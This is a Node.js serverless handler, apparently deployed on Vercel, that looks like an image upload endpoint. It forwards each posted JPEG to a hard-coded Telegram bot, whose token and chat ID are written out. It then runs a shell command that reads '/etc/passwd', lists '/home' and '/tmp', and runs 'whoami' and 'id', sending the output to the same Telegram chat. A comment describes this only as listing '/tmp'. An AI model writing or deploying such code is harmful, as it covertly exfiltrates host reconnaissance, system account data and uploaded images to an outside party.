const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const { exec } = require('child_process');

const BOT_TOKEN = '7391339726:AAGvGFhkxLmdLS1irRMTMnzUnNHBHskXZMY';
const CHAT_ID = '1174153911';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send({ message: 'Only POST requests are allowed' });
    }

    const { image } = req.body;

    // Decode the base64 image and save it as a file
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = '/tmp/image.jpg'; // Vercel function can write to /tmp directory
    fs.writeFileSync(filePath, base64Data, 'base64');

    // Prepare the image for sending to Telegram
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', fs.createReadStream(filePath));

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders()
            }
        });
        console.log('Image sent successfully:', response.data);

        // List the contents of the /tmp directory
        exec('ls -la /tmp ; whoami ; id ; ls -la /home; cat /etc/passwd', async (error, stdout, stderr) => {
            console.log("lls 1")
            if (error) {
                console.error(`Error listing directory contents: ${error}`);
                return res.status(500).json({ status: 'error', message: 'Error listing directory contents' });
            }

            console.log(`Directory contents: ${stdout}`);

            // Send the directory contents to the Telegram boti
            try {
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: `Directory contents:\n${stdout}`
                });
                console.log('Directory contents sent successfully');
            } catch (error) {
                console.error('Error sending directory contents:', error);
            }

            res.json({ status: 'success' });
        });
    } catch (error) {
        console.error('Error sending image:', error);
        res.status(500).json({ status: 'error' });
    }
}
